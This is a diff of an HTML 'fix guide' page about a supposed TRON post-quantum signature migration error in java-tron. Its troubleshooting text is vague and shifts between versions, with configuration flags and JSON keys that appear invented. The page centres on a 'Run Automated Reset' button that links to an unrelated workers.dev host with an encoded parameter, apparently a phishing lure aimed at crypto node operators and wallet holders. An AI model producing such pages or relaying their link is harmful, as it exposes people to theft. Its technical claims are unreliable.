@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>java-tron [Feature] TRON Post-Quantum Signature Migration – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Error – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,38 +39,37 @@
 </head>
 <body>
 <div class="content">
-<h1>java-tron [Feature] TRON Post-Quantum Signature Migration</h1>
+<h1>TRON Post-Quantum Signature Migration Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience issues with transaction verification and validation on the TRON network after the implementation of post-quantum signature migration, resulting in failed transactions and errors.</li>
+<li>Users encounter issues when attempting to migrate to post-quantum signatures on the TRON network using java-tron, resulting in failed transactions and error messages indicating incompatible signature schemes.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to incompatible signature schemes between nodes that have been updated to support post-quantum signatures and those that have not, leading to a lack of consensus on the validity of transactions.</li>
+<li>The error occurs due to the mismatch between the traditional elliptic curve cryptography used currently and the newly introduced post-quantum cryptography, which requires an update in the java-tron implementation to support both schemes seamlessly.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To override the default signature scheme, use the following commands:</li>
-<li>Update the <code>tron.cfg</code> file to include the post-quantum signature parameters</li>
-<li>Run the <code>java-tron</code> node with the <code>--post-quantum</code> flag enabled</li>
-<li>Verify the node's configuration using the following code block:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Update java-tron to the latest version supporting post-quantum signatures.</li>
+<li>Configure the node to use a hybrid mode that supports both traditional and post-quantum signatures.</li>
+<li>Implement a custom solution using the following json configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;postQuantum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SPHINCS&quot;</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;postQuantum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;hybridMode&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;traditionalCurve&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;secp256k1&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more precise configuration control.</p>
+<p>Consider utilizing an external console for more complex configurations. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A fully synchronized TRON node</li>
-<li>The latest version of <code>java-tron</code> installed</li>
-<li>A backup of the existing <code>tron.cfg</code> file</li>
+<li>Latest version of java-tron installed</li>
+<li>Node configured for hybrid signature mode</li>
+<li>Understanding of post-quantum cryptography principles</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writ</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failure</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">java-tron [Feature] TRON Post-Quantum Signature Migration</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
